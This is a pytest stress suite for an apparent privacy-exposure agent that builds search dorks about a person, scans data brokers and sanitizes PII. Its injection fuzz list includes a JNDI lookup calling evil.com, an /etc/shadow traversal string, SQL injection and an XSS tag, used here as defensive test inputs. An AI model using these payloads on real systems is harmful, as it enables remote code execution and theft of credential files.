"""
Project Umbra Milestone 1 Adversarial & Stress Testing Suite.
Empirically stress-tests:
1. Malformed, empty, and ultra-complex TargetIdentityInput personas (100+ items, Unicode, invalid phones).
2. Dork query syntax fuzzing (operator injection, special characters, length overflows >2048 chars, encoding).
3. Extreme step budget scenarios (budget=0, budget=1, budget=2, budget=100, infinite loop attempts).
4. PII Sanitization substring collisions, risk score boundaries, and round-trip restoration fidelity.
"""

from __future__ import annotations

import asyncio
import time
import urllib.parse
import pytest
from pydantic import ValidationError
from unittest.mock import MagicMock

from project_umbra.classifiers.gemma_classifier import GemmaSanitizerClassifier
from project_umbra.classifiers.heuristics import (
    DeterministicPIIExtractor,
    FastPIISanitizer,
    validate_luhn,
)
from project_umbra.core.agent import ProjectUmbraAgent
from project_umbra.core.decomposer import IdentityDecomposer, PhoneFormats
from project_umbra.core.dork_synthesizer import PrecisionDorkSynthesizer
from project_umbra.core.state import (
    AgentLifecycleState,
    AgentTelemetryEvent,
    BrokerScanResult,
    BrokerScanTarget,
    DorkCategory,
    ExtractedEntityProfile,
    PIISeverity,
    PIITokenType,
    PriorityLevel,
    TargetIdentityInput,
    TelemetryEventType,
    VectorCategory,
)


@pytest.fixture
def decomposer() -> IdentityDecomposer:
    return IdentityDecomposer()


@pytest.fixture
def synthesizer() -> PrecisionDorkSynthesizer:
    return PrecisionDorkSynthesizer()


@pytest.fixture
def sanitizer() -> GemmaSanitizerClassifier:
    return GemmaSanitizerClassifier(mode="heuristic")


# ==============================================================================
# 1. Persona & Input Stress Tests (TargetIdentityInput & IdentityDecomposer)
# ==============================================================================

class TestPersonaAndInputStress:
    """Stress tests TargetIdentityInput and IdentityDecomposer with extreme inputs."""


    def test_ultra_complex_massive_persona_scaling(self, decomposer: IdentityDecomposer) -> None:
        """
        Stress-tests with 150 aliases, 50 secondary emails, 50 phone numbers,
        30 addresses, 50 relatives, 50 employers, and 100 usernames.
        Verifies execution speed (<500ms), deduplication, and priority sorting.
        """
        aliases = [f"Alias Person {i}" for i in range(150)]
        emails = [f"sec_email_{i}@testdomain{i % 10}.org" for i in range(50)]
        phones = [f"555-{i:03d}-{(i*7)%10000:04d}" for i in range(50)]
        addresses = [f"{100 + i} Elm St, Suite {i}, City {i % 5}, TX 75001" for i in range(30)]
        relatives = [f"Relative Name {i}" for i in range(50)]
        employers = [f"Enterprise Corp {i}" for i in range(50)]
        usernames = [f"user_handle_{i}" for i in range(100)]

        target = TargetIdentityInput(
            full_name="Mega Target Complexus",
            aliases=aliases,
            primary_email="primary.mega@targetcorp.io",
            secondary_emails=emails,
            phone_numbers=phones,
            current_city="Austin",
            current_state="Texas",
            known_addresses=addresses,
            relatives=relatives,
            employers=employers,
            usernames=usernames,
        )

        t0 = time.perf_counter()
        result = decomposer.decompose(target)
        duration_ms = (time.perf_counter() - t0) * 1000

        # Performance requirement: Must complete in < 500ms even with massive persona
        assert duration_ms < 500.0, f"Decomposition too slow: {duration_ms:.2f}ms"
        assert result.total_vectors > 200

        # Verify no duplicate (category, query_term.lower()) pairs
        seen_keys: set[tuple[str, str]] = set()
        for v in result.vectors:
            key = (v.category.value, v.query_term.lower())
            assert key not in seen_keys, f"Duplicate vector found: {key}"
            seen_keys.add(key)

        # Verify priority sorting
        p_order = {
            PriorityLevel.CRITICAL: 0,
            PriorityLevel.HIGH: 1,
            PriorityLevel.MEDIUM: 2,
            PriorityLevel.LOW: 3,
        }
        for i in range(len(result.vectors) - 1):
            assert p_order[result.vectors[i].priority] <= p_order[result.vectors[i + 1].priority]

    @pytest.mark.parametrize(
        "weird_name, expected_clean",
        [
            ("   محمد بن عبد الله   ", "محمد بن عبد الله"),  # Arabic RTL
            ("山田太郎", "山田太郎"),  # Japanese Kanji
            ("José María Álvarez-Pallete", "José María Álvarez-Pallete"),  # Spanish accents & hyphen
            ("François Müller-Åström", "François Müller-Åström"),  # French/German/Nordic diacritics
            ("Иван Иванович Иванов", "Иван Иванович Иванов"),  # Russian Cyrillic
            ("Dr. Martin Luther King Jr.", "Martin Luther King"),  # Strips Dr. and Jr.
            ("Sir Isaac Newton", "Sir Isaac Newton"),  # Non-standard title kept
            ("O'Connor", "O'Connor"),  # Apostrophe name
            ("Jean-Luc Picard", "Jean-Luc Picard"),  # Hyphenated first name
            ("A" * 200, "A" * 200),  # Very long name
        ],
    )
    def test_unicode_and_international_names(
        self, decomposer: IdentityDecomposer, weird_name: str, expected_clean: str
    ) -> None:
        """Verifies decomposition of Unicode, RTL, diacritics, and honorific stripped names."""
        target = TargetIdentityInput(full_name=weird_name)
        result = decomposer.decompose(target)

        assert result.total_vectors >= 1
        name_vec = next(v for v in result.vectors if v.category == VectorCategory.DIRECT_IDENTIFIER)
        assert name_vec.query_term == expected_clean

    def test_invalid_and_exotic_phone_formats(self) -> None:
        """Verifies phone parsing against extreme, malformed, or unusual phone strings."""
        cases = [
            ("123", None),  # Too short (< 7 digits)
            ("000-000-0000", "+10000000000"),  # All zeroes NANP
            ("1-800-555-0199", "+18005550199"),  # 11 digits starting with 1
            ("+44 20 7946 0912", "+442079460912"),  # UK international
            ("+81-3-1234-5678", "+81312345678"),  # Japan international
            ("phone: (555) 012-3456 ext 99", "+555012345699"),  # Extra digits extracted
            ("CALL-NOW-9999", None),  # Less than 7 digits after digit stripping (4 digits)
            ("1234567", "+1234567"),  # 7 digits
            ("9" * 30, f"+{'9'*30}"),  # Extreme 30 digits
        ]
        for raw, expected_e164 in cases:
            p = PhoneFormats(raw)
            if expected_e164:
                assert p.e164 == expected_e164, f"Failed for {raw}: got {p.e164} != {expected_e164}"
            else:
                assert p.e164 is None, f"Expected None for {raw}, got {p.e164}"

    def test_target_identity_validation_rejections(self) -> None:
        """Verifies Pydantic v2 rejects empty, single-character, or invalid personas."""
        # Empty string
        with pytest.raises(ValidationError):
            TargetIdentityInput(full_name="")

        # Single character string
        with pytest.raises(ValidationError):
            TargetIdentityInput(full_name="A")

        # Whitespace-only string (stripped by Pydantic ConfigDict to "")
        with pytest.raises(ValidationError):
            TargetIdentityInput(full_name="    ")

    def test_minimal_two_char_target_name(self, decomposer: IdentityDecomposer) -> None:
        """Verifies 2-character valid names (e.g., 'Al', 'Bo', 'Li') succeed."""
        target = TargetIdentityInput(full_name="Al")
        result = decomposer.decompose(target)
        assert result.total_vectors >= 1
        assert result.vectors[0].query_term == "Al"


# ==============================================================================
# 2. Dork Query Syntax Fuzzing & Operator Injection Tests
# ==============================================================================

class TestDorkSyntaxFuzzingAndInjection:
    """Stress tests PrecisionDorkSynthesizer with operator injections and overflows."""

    def test_dork_syntax_operator_injection_resilience(

        self, decomposer: IdentityDecomposer, synthesizer: PrecisionDorkSynthesizer
    ) -> None:
        """
        Fuzzes target inputs with Google search operators and SQL/Command injection fragments.
        Verifies synthesizer does not crash, generates valid URLs, and enforces syntax rules.
        """
        injections = [
            'site:evil.com filetype:exe "password" OR 1=1',
            'inurl:admin intext:"confidential" (site:gov OR site:mil)',
            'Robert "Bob" O\'Connor Jr. AND filetype:pdf',
            '<script>alert("XSS")</script>',
            '; DROP TABLE dorks; --',
            '${jndi:ldap://evil.com/a}',
            '../../../../etc/shadow',
            '((((((nested parentheses))))))',
            ':::multiple::colons:::',
        ]

        for payload in injections:
            target = TargetIdentityInput(
                full_name=f"Victim {payload}",
                primary_email=f"payload_{payload[:10].replace(' ', '_')}@test.com",
                usernames=[payload],
                employers=[payload],
            )
            decomp = decomposer.decompose(target)
            res = synthesizer.synthesize(decomp)

            assert res.total_dorks > 0
            for dork in res.dorks:
                # 1. dork_id must be valid
                assert dork.dork_id.startswith("drk_")
                # 2. Query length must not exceed 2048
                assert len(dork.raw_query) <= 2048
                # 3. URL must be properly formed
                assert dork.encoded_url.startswith("https://www.google.com/search?q=")
                # 4. URL decode check
                query_str = dork.encoded_url[len("https://www.google.com/search?q=") :]
                decoded = urllib.parse.unquote_plus(query_str)
                assert decoded == dork.raw_query

    def test_extreme_query_length_overflow_truncation(
        self, decomposer: IdentityDecomposer, synthesizer: PrecisionDorkSynthesizer
    ) -> None:
        """
        Verifies that strings exceeding 2048 characters are strictly truncated
        at the 2048-character boundary without crashing or producing corrupt URLs.
        """
        massive_name = "MassiveName_" + "A" * 3000
        target = TargetIdentityInput(full_name=massive_name)
        decomp = decomposer.decompose(target)
        result = synthesizer.synthesize(decomp)

        assert result.total_dorks > 0
        for dork in result.dorks:
            assert len(dork.raw_query) <= 2048
            assert dork.encoded_url.startswith("https://www.google.com/search?q=")

    def test_unicode_and_emoji_dork_url_encoding(
        self, decomposer: IdentityDecomposer, synthesizer: PrecisionDorkSynthesizer
    ) -> None:
        """Verifies that non-ASCII and emoji inputs produce valid UTF-8 percent-encoded URLs."""
        target = TargetIdentityInput(
            full_name="🔍 Agent 🕵️‍♂️ 007",
            primary_email="agent.🕵️@secret.org",
            usernames=["spÿ_måstér_007"],
        )
        decomp = decomposer.decompose(target)
        res = synthesizer.synthesize(decomp)

        for dork in res.dorks:
            assert "%" in dork.encoded_url or "https://" in dork.encoded_url
            query_part = dork.encoded_url.split("https://www.google.com/search?q=")[1]
            # Must be valid ASCII characters only in the encoded URL
            query_part.encode("ascii")
            decoded = urllib.parse.unquote_plus(query_part)
            assert decoded == dork.raw_query


@pytest.fixture
def sample_target() -> TargetIdentityInput:
    return TargetIdentityInput(
        full_name="Alexander Vance",
        primary_email="avance@blackmesa.gov",
        phone_numbers=["(555) 019-2834"],
        current_city="Seattle",
        current_state="WA",
    )


# ==============================================================================
# 3. Extreme Step Budget & FSM Scenarios (ProjectUmbraAgent)
# ==============================================================================

class TestExtremeStepBudgetAndFSM:
    """Stress tests ProjectUmbraAgent under extreme budget bounds and loop conditions."""


    @pytest.mark.asyncio
    async def test_extreme_budget_zero(self, sample_target: TargetIdentityInput) -> None:
        """
        budget = 0: Must halt immediately at INITIALIZED -> BUDGET_EXHAUSTED.
        Total steps executed must be 0, remaining 0, summary compiled cleanly.
        """
        events: list[AgentTelemetryEvent] = []

        async def cb(evt: AgentTelemetryEvent) -> None:
            events.append(evt)

        agent = ProjectUmbraAgent(max_budget=0)
        summary = await agent.run_mission(sample_target, event_callback=cb)

        assert summary.final_state == AgentLifecycleState.BUDGET_EXHAUSTED
        assert summary.total_steps_executed == 0
        assert summary.budget_remaining == 0
        assert summary.budget_allocated == 0

        event_types = [e.event_type for e in events]
        assert TelemetryEventType.SCAN_INITIATED in event_types
        assert TelemetryEventType.BUDGET_EXHAUSTED in event_types
        assert TelemetryEventType.SCAN_COMPLETED not in event_types

    @pytest.mark.asyncio
    async def test_extreme_budget_one(self, sample_target: TargetIdentityInput) -> None:
        """
        budget = 1: Must execute Phase 1 (Decomposition), then exhaust on Phase 2.
        Total steps executed must be 1.
        """
        agent = ProjectUmbraAgent(max_budget=1)
        summary = await agent.run_mission(sample_target)

        assert summary.final_state == AgentLifecycleState.BUDGET_EXHAUSTED
        assert summary.total_steps_executed == 1
        assert summary.budget_remaining == 0
        assert summary.vectors_analyzed > 0
        assert summary.dorks_executed == 0  # Dork phase halted

    @pytest.mark.asyncio
    async def test_extreme_budget_two(self, sample_target: TargetIdentityInput) -> None:
        """
        budget = 2: Must execute Phase 1 (Decomposition) and Phase 2 (Dork Synthesis),
        then halt on scanning. Total steps executed must be 2.
        """
        agent = ProjectUmbraAgent(max_budget=2)
        summary = await agent.run_mission(sample_target)

        assert summary.final_state == AgentLifecycleState.BUDGET_EXHAUSTED
        assert summary.total_steps_executed == 2
        assert summary.budget_remaining == 0
        assert summary.vectors_analyzed > 0
        assert summary.dorks_executed > 0

    @pytest.mark.asyncio
    async def test_extreme_budget_hundred(self, sample_target: TargetIdentityInput) -> None:
        """
        budget = 100: Must complete entire lifecycle cleanly with remaining budget.
        """
        agent = ProjectUmbraAgent(max_budget=100)
        summary = await agent.run_mission(sample_target)

        assert summary.final_state == AgentLifecycleState.COMPLETED
        assert summary.total_steps_executed > 0
        assert summary.total_steps_executed < 100
        assert summary.budget_remaining == 100 - summary.total_steps_executed
        assert summary.remediations_generated > 0

    @pytest.mark.asyncio
    async def test_infinite_loop_prevention_on_repeated_brokers(
        self, sample_target: TargetIdentityInput
    ) -> None:
        """
        Simulates an adversary configuring 20 identical broker targets.
        Verifies that check_loop suppresses executions after count > 2 and emits LOOP_DETECTED.
        """
        same_broker = BrokerScanTarget(
            broker_id="loop_broker",
            broker_name="LoopBroker",
            base_url="https://loop.com",
            opt_out_url="https://loop.com/optout",
            search_url_template="https://loop.com/q={name}",
        )
        loop_targets = [same_broker] * 20

        events: list[AgentTelemetryEvent] = []

        async def cb(evt: AgentTelemetryEvent) -> None:
            events.append(evt)

        agent = ProjectUmbraAgent(max_budget=30, broker_targets=loop_targets)
        summary = await agent.run_mission(sample_target, event_callback=cb)

        assert summary.final_state == AgentLifecycleState.COMPLETED
        loop_events = [e for e in events if e.event_type == TelemetryEventType.LOOP_DETECTED]
        assert len(loop_events) >= 1

        # Confirm broker was only executed at most 2 times
        browser_steps = [
            rec for rec in summary.execution_state_log if rec.tool_name == "broker_fixture_fallback"
        ]
        assert len(browser_steps) == 2
        assert all(rec.provenance.value == "fallback" for rec in browser_steps)

    @pytest.mark.asyncio
    async def test_tool_failure_exception_handling(
        self, sample_target: TargetIdentityInput
    ) -> None:
        """
        Verifies that if a tool throws an unhandled exception,
        the agent gracefully transitions to FAILED without crashing unhandled.
        """
        mock_failing_decomposer = MagicMock()
        mock_failing_decomposer.decompose.side_effect = RuntimeError("Database crash")

        events: list[AgentTelemetryEvent] = []

        async def cb(evt: AgentTelemetryEvent) -> None:
            events.append(evt)

        agent = ProjectUmbraAgent(decomposer=mock_failing_decomposer, max_budget=25)
        summary = await agent.run_mission(sample_target, event_callback=cb)

        assert summary.final_state == AgentLifecycleState.FAILED
        event_types = [e.event_type for e in events]
        assert TelemetryEventType.SCAN_FAILED in event_types


# ==============================================================================
# 4. PII Sanitization & Restoration Stress Tests
# ==============================================================================

class TestPIISanitizerAdversarialStress:
    """Stress tests GemmaSanitizerClassifier and FastPIISanitizer."""

    def test_overlapping_substring_replacement_integrity(

        self, sanitizer: GemmaSanitizerClassifier
    ) -> None:
        """
        Tests tricky overlapping substring cases:
        - "John Doe Jr." vs "John Doe" vs "John"
        - "admin@domain.com" vs "admin@domain.company.com"
        Verifies that longest matches are replaced first and no surrogate token is corrupted.
        """
        text = (
            "Names: John Doe Jr. and John Doe both lived at 100 Main St, Dallas, TX 75001. "
            "Emails: admin@domain.company.com and admin@domain.com."
        )
        res = sanitizer.classify_and_sanitize(text)

        # Ensure no broken tokens like "[PII_FULL_NAME_01] Jr."
        assert "Jr." not in res.sanitized_text or "[PII_" in res.sanitized_text
        assert "admin@domain.company.com" not in res.sanitized_text
        assert "admin@domain.com" not in res.sanitized_text

        # Test exact 100% roundtrip restoration
        restored = sanitizer.restore_sanitized_text(res.sanitized_text, res.redaction_map)
        assert restored == text

    def test_risk_score_clamping_under_massive_pii(
        self, sanitizer: GemmaSanitizerClassifier
    ) -> None:
        """
        Verifies that an extreme payload with hundreds of critical PII tokens
        strictly clamps risk score to 100.0 without numeric overflow.
        """
        ssns = [f"{100+i:03d}-{(i*11)%100:02d}-{(i*77)%10000:04d}" for i in range(50)]
        cards = ["4111111111111111"] * 50
        huge_text = f"SSNs: {', '.join(ssns)}\nCards: {', '.join(cards)}"

        res = sanitizer.classify_and_sanitize(huge_text)
        assert res.overall_risk_score == 100.0
        assert res.critical_pii_count >= 1

    def test_pre_existing_surrogate_token_in_text(
        self, sanitizer: GemmaSanitizerClassifier
    ) -> None:
        """
        Verifies handling when the input text itself contains pre-existing strings
        formatted like surrogate tokens (e.g. '[PII_EMAIL_01]').
        """
        text = "This is a pre-existing token [PII_EMAIL_01] and a real email test@corp.io"
        res = sanitizer.classify_and_sanitize(text)

        assert "test@corp.io" not in res.sanitized_text
        # Restoration test
        restored = sanitizer.restore_sanitized_text(res.sanitized_text, res.redaction_map)
        assert "test@corp.io" in restored

    def test_multiline_and_nested_profile_sanitization(
        self, sanitizer: GemmaSanitizerClassifier
    ) -> None:
        """Verifies structured ExtractedEntityProfile sanitization and deep restoration."""
        profile = ExtractedEntityProfile(
            target_id="tgt_adversarial_1",
            source_url="https://broker.com/profile/1",
            source_broker="TestBroker",
            matched_names=["Marcus Aurelius Brody", "Mark Brody"],
            phone_numbers=["(214) 555-0192", "214.555.0199"],
            email_addresses=["m.brody@texastech.edu", "mbrody@gmail.com"],
            current_address="1428 Elm Street, Dallas, TX 75201",
            past_addresses=["100 Oak Lane, Austin, TX 78701"],
            relatives=["Eleanor Brody", "Thomas Brody"],
            associates=["Colleague One"],
        )

        sanitized_prof, res = sanitizer.sanitize_profile(profile)

        # Check that sensitive fields are surrogate masked
        assert sanitized_prof.email_addresses[0].startswith("[PII_EMAIL_")
        assert sanitized_prof.phone_numbers[0].startswith("[PII_PHONE_")
        assert sanitized_prof.current_address.startswith("[PII_PHYSICAL_ADDRESS_")

        # Check restoration back to exact original profile
        restored_prof = sanitizer.restore_profile(sanitized_prof, res.redaction_map)
        assert restored_prof.matched_names == profile.matched_names
        assert restored_prof.phone_numbers == profile.phone_numbers
        assert restored_prof.email_addresses == profile.email_addresses
        assert restored_prof.current_address == profile.current_address
        assert restored_prof.past_addresses == profile.past_addresses
        assert restored_prof.relatives == profile.relatives


# ==============================================================================
# 5. Concurrency, Sparse Inputs & Edge States
# ==============================================================================

class TestConcurrencyAndEdgeStates:
    """Stress tests concurrent mission execution and sparse/degenerate states."""

    @pytest.mark.asyncio
    async def test_concurrent_multi_agent_missions(self) -> None:
        """
        Runs 10 concurrent autonomous agent missions on separate agent instances.
        Verifies complete isolation, zero cross-talk, and 100% completion.
        """
        targets = [
            TargetIdentityInput(
                full_name=f"Concurrent Target {i}",
                primary_email=f"target_{i}@parallel-test.org",
                phone_numbers=[f"555-010-{i:04d}"],
                current_city="Austin",
                current_state="TX",
            )
            for i in range(10)
        ]

        async def run_single(t: TargetIdentityInput, idx: int) -> tuple[int, Any]:
            agent = ProjectUmbraAgent(max_budget=25)
            summary = await agent.run_mission(t, scan_id=f"scan_parallel_{idx}")
            return idx, summary

        tasks = [run_single(t, i) for i, t in enumerate(targets)]
        results = await asyncio.gather(*tasks)

        assert len(results) == 10
        for idx, summary in results:
            assert summary.final_state == AgentLifecycleState.COMPLETED
            assert summary.run_id == f"scan_parallel_{idx}"
            assert summary.target_name == f"Concurrent Target {idx}"
            assert summary.remediations_generated > 0

    @pytest.mark.asyncio
    async def test_agent_with_empty_broker_targets(self) -> None:
        """
        Verifies agent initialization when passing empty broker targets.
        Note: Due to 'broker_targets or self.DEFAULT_BROKER_TARGETS', passing [] falls back
        to DEFAULT_BROKER_TARGETS safely without crashes.
        """
        target = TargetIdentityInput(
            full_name="No Broker Target",
            primary_email="nobroker@test.io",
        )
        agent = ProjectUmbraAgent(max_budget=25, broker_targets=[])
        summary = await agent.run_mission(target)

        assert summary.final_state == AgentLifecycleState.COMPLETED
        assert summary.brokers_scanned == len(agent.broker_targets)


    def test_dork_synthesizer_sparse_persona(
        self, decomposer: IdentityDecomposer, synthesizer: PrecisionDorkSynthesizer
    ) -> None:
        """
        Persona with only name and employer (no emails, no phones, no usernames, no city/state).
        Verifies synthesizer does not fail with KeyError/AttributeError and produces valid dorks.
        """
        sparse = TargetIdentityInput(
            full_name="Bare Minimum",
            employers=["Only Employer Inc"],
        )
        decomp = decomposer.decompose(sparse)
        res = synthesizer.synthesize(decomp)

        assert res.total_dorks > 0
        categories = {d.category for d in res.dorks}
        assert DorkCategory.DOCUMENTS_SPREADSHEETS in categories
        assert DorkCategory.SOCIAL_EXPOSURE in categories

    def test_sanitizer_completely_empty_profile(
        self, sanitizer: GemmaSanitizerClassifier
    ) -> None:
        """ExtractedEntityProfile with all optional fields empty or None."""
        empty_profile = ExtractedEntityProfile(
            target_id="tgt_empty_1",
            source_url="https://empty.example.com",
            matched_names=[],
            phone_numbers=[],
            email_addresses=[],
            current_address=None,
            past_addresses=[],
            relatives=[],
            associates=[],
        )
        sanitized_prof, res = sanitizer.sanitize_profile(empty_profile)
        assert res.total_pii_count == 0
        restored = sanitizer.restore_profile(sanitized_prof, res.redaction_map)
        assert restored.target_id == empty_profile.target_id
        assert restored.source_url == empty_profile.source_url
